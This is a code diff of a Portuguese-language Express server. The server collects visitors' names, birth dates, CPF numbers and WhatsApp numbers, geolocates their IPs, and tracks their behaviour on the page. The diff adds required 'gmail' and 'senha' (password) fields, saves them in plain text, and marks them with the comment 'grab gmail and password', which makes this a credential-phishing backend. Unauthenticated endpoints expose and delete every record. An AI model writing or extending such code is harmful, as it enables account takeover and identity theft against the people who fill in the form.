@@ -42,7 +42,7 @@ async function buscarLocalizacao(ip) {
     if (!ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
       return { pais: 'Local', codigoPais: 'XX', regiao: '-', cidade: '-', cep: '-', operadora: '-', timezone: '-' };
     }
-    const url = `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,isp,org,timezone,query&lang=pt-BR`;
+    const url = 'http://ip-api.com/json/' + ip + '?fields=status,country,countryCode,regionName,city,zip,isp,org,timezone,query&lang=pt-BR';
     const r = await fetch(url);
     const d = await r.json();
     if (d.status !== 'success') return null;
@@ -93,16 +93,24 @@ app.get('/visitas', (req, res) => {
 
 // ---------- FORMULÁRIO ----------
 app.post('/enviar', async (req, res) => {
-  const {
-    nome, dataNascimento, cpf, whatsapp,
-    dispositivo, origem, jaVisitou, tempoPreenchimento,
-    tempoFora, copiouAlgo, velocidadeDigitacao
-  } = req.body;
+  // ⚡ AQUI: pega gmail e senha
+  const nome = req.body.nome;
+  const dataNascimento = req.body.dataNascimento;
+  const cpf = req.body.cpf;
+  const whatsapp = req.body.whatsapp;
+  const gmail = req.body.gmail;
+  const senha = req.body.senha;
+  const dispositivo = req.body.dispositivo;
+  const origem = req.body.origem;
+  const jaVisitou = req.body.jaVisitou;
+  const tempoPreenchimento = req.body.tempoPreenchimento;
+  const tempoFora = req.body.tempoFora;
+  const copiouAlgo = req.body.copiouAlgo;
+  const velocidadeDigitacao = req.body.velocidadeDigitacao;
 
-  const obrigatorios = { nome, dataNascimento, cpf, whatsapp };
-  const faltando = Object.keys(obrigatorios).filter(k => !obrigatorios[k]);
-  if (faltando.length > 0) {
-    return res.status(400).json({ sucesso: false, erro: 'Campos faltando: ' + faltando.join(', ') });
+  // Validação
+  if (!nome || !dataNascimento || !cpf || !whatsapp || !gmail || !senha) {
+    return res.status(400).json({ sucesso: false, erro: 'Preencha todos os campos obrigatórios.' });
   }
 
   const ip = pegarIP(req);
@@ -111,10 +119,12 @@ app.post('/enviar', async (req, res) => {
   const dados = lerDados();
   const novo = {
     id: Date.now(),
-    nome,
-    dataNascimento,
-    cpf,
-    whatsapp,
+    nome: nome,
+    dataNascimento: dataNascimento,
+    cpf: cpf,
+    whatsapp: whatsapp,
+    gmail: gmail,          // ⚡ NOVO
+    senha: senha,          // ⚡ NOVO
     dispositivo: dispositivo || null,
     ip: ip,
     localizacao: localizacao,
@@ -136,7 +146,8 @@ app.post('/enviar', async (req, res) => {
 
 // ---------- MENSAGEM DE TEXTO ----------
 app.post('/enviar-mensagem', (req, res) => {
-  const { idCadastro, mensagem } = req.body;
+  const idCadastro = req.body.idCadastro;
+  const mensagem = req.body.mensagem;
 
   if (!idCadastro || !mensagem) {
     return res.status(400).json({ sucesso: false, erro: 'ID ou mensagem faltando.' });
@@ -147,7 +158,7 @@ app.post('/enviar-mensagem', (req, res) => {
   }
 
   const dados = lerDados();
-  const idx = dados.findIndex(d => d.id === Number(idCadastro));
+  const idx = dados.findIndex(function(d) { return d.id === Number(idCadastro); });
   if (idx === -1) {
     return res.status(404).json({ sucesso: false, erro: 'Cadastro não encontrado.' });
   }
@@ -161,14 +172,14 @@ app.post('/enviar-mensagem', (req, res) => {
 // ---------- LISTAR ----------
 app.get('/dados', (req, res) => {
   const dados = lerDados();
-  res.json({ sucesso: true, total: dados.length, dados });
+  res.json({ sucesso: true, total: dados.length, dados: dados });
 });
 
 // ---------- DELETAR 1 ----------
 app.delete('/dados/:id', (req, res) => {
   const id = Number(req.params.id);
   const dados = lerDados();
-  const filtrado = dados.filter(d => d.id !== id);
+  const filtrado = dados.filter(function(d) { return d.id !== id; });
   if (filtrado.length === dados.length) {
     return res.status(404).json({ sucesso: false, erro: 'ID não encontrado.' });
   }
@@ -180,9 +191,9 @@ app.delete('/dados/:id', (req, res) => {
 app.delete('/dados', (req, res) => {
   salvarDados([]);
   salvarVisitas({ total: 0, hoje: 0, data: new Date().toDateString() });
-  res.json({ sucesso: true, mensagem: 'Tudo zerado: cadastros e visitas.' });
+  res.json({ sucesso: true, mensagem: 'Tudo zerado.' });
 });
 
-app.listen(PORT, () => {
-  console.log(`🚀 API rodando na porta ${PORT}`);
+app.listen(PORT, function() {
+  console.log('🚀 API rodando na porta ' + PORT);
 });
